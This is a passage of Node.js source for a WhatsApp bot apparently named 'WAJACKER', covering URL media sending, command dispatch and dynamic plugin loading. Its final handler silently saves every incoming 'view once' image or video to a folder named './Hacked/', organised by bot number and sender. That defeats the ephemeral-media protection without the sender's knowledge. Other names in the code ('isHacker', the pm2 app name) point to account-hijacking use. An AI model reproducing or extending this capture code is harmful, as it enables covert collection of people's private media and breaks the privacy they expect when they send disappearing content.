      }, {});
    };
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let res = await axios.head(url);
      let mime = res.headers['content-type'];
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption, gifPlayback: true, ...options }, { quoted, ...options });
      }
      let type = mime.split("/")[0] + "Message";
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption, ...options }, { quoted, ...options });
      }
      if (mime.startsWith("image")) {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption, ...options }, { quoted, ...options });
      }
      if (mime.startsWith("video")) {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption, mimetype: 'video/mp4', ...options }, { quoted, ...options });
      }
      if (mime.startsWith("audio")) {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption, mimetype: 'audio/mpeg', ...options }, { quoted, ...options });
      }
    };
    if (isInternalCmd) {
      const cmd = commands.find(cmd => cmd.pattern === command) || commands.find(cmd => cmd.alias && cmd.alias.includes(command));
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
        try {
          cmd.function(conn, mek, m, { from, quoted, body, isInternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
        } catch (e) {
          console.error("[COMMAND ERROR] " + e);
        }
      }
    } else if (isExternalCmd) {
      try {
        const pluginPath = path.join(__dirname, 'plugins', command + '.js');
        if (fs.existsSync(pluginPath)) {
          delete require.cache[require.resolve(pluginPath)];
          const plugin = require(pluginPath);
          if (typeof plugin === 'function') {
            await plugin(conn, mek, m, { from, quoted, body, isExternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
          }
        }
      } catch (e) {
        console.error('Plugin error:', e);
      }
    }
    for (const command of commands) {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, quoted, body, isInternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, quoted, body, isInternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, quoted, body, isInternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(conn, mek, m, { from, quoted, body, isInternalCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      }
    }
    if (m.type === 'viewOnceMessage') {
      const mediaTypes = ['imageMessage', 'videoMessage'];
      const innerType = getContentType(m.msg);
      if (mediaTypes.includes(innerType)) {
        const baseDir = `./Hacked/${botNumber}`;
        const subDir = isGroup ? 'group' : 'private';
        const dirPath = `${baseDir}/${subDir}`;
        if (!fs.existsSync('./Hacked')) {
          fs.mkdirSync('./Hacked', { recursive: true });
        }
        if (!fs.existsSync(baseDir)) {
          fs.mkdirSync(baseDir, { recursive: true });
        }
        if (!fs.existsSync(dirPath)) {
          fs.mkdirSync(dirPath, { recursive: true });
        }
        try {
          const buffer = await downloadMediaMessage(m, `${Date.now()}`);
          if (buffer) {
            const ext = innerType === 'imageMessage' ? '.jpg' : '.mp4';
            const fileName = isGroup ? `${from}_${Date.now()}${ext}` : `${senderNumber}_${Date.now()}${ext}`;
            const filePath = `${dirPath}/${fileName}`;
            fs.writeFile(filePath, buffer, (err) => {
              if (err) console.error('Error saving view once media:', err);
              else console.log(`Saved view once ${innerType} to ${filePath}`);
            });
          }
        } catch (error) {
          console.error(`Error saving view once media: ${error}`);
        }
      }
    }
  });
}

setTimeout(async () => {
  await autoStartSessions();
  // Setup message handlers for all sessions (already done in startSession, but ensure)
  for (const session in connections) {
    setupMessageHandler(connections[session]);
  }
}, 4000);

module.exports = {
  apps: [{
    name: 'WAJACKER',
    script: 'wajacker.js',
    instances: 1,
    autorestart: true,
    watch: false,
    max_memory_restart: '1G',
    env: {
      NODE_ENV: 'production',
      PIDUSAGE_SILENT: '1'  // Suppress pidusage console messages
    },
    pm2: {
      sysmonit: false  // Disable system monitoring to avoid pidusage errors
    }
  }]
};
